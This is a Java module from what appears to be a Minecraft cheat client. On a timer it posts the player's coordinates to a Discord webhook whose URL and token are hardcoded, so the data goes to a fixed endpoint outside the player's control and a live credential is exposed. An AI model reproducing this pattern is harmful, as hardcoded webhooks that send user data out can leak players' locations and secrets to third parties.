package io.ace.nordclient.hacks.misc;

import io.ace.nordclient.CousinWare;
import io.ace.nordclient.hacks.Hack;
import io.ace.nordclient.utilz.DiscordWebhookUtil;
import io.ace.nordclient.utilz.Setting;

import java.io.IOException;


public class Coords2Discord extends Hack {
    Setting cooldown;

    public Coords2Discord() {
        super("Coords2Discord", Category.MISC, "", 123547605);
        CousinWare.INSTANCE.settingsManager.rSetting(cooldown = new Setting("Timeout", this, 5, 1, 60, true, "CoordCooldown", true));

    }
    int count = 0;

    @Override
    public void onUpdate() {
        count++;
        if (count > cooldown.getValInt()*1200){
            count = 0;
            DiscordWebhookUtil webhook = new DiscordWebhookUtil("https://discord.com/api/webhooks/918512641327112232/sT_ePp7iPMdHYTv-VMhx4aHFa8caLEGj_Bz1GO2X6I6sLqf3vRMSQkH8GBGQuM-a_FqA");
            webhook.setContent(mc.player.getPosition().toString());
            webhook.setUsername("Coordinates Alert");

            webhook.addEmbed(new DiscordWebhookUtil.EmbedObject()
                    .setDescription("Player Coordinates"));
            try {
                webhook.execute(); //Handle exception
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }




}
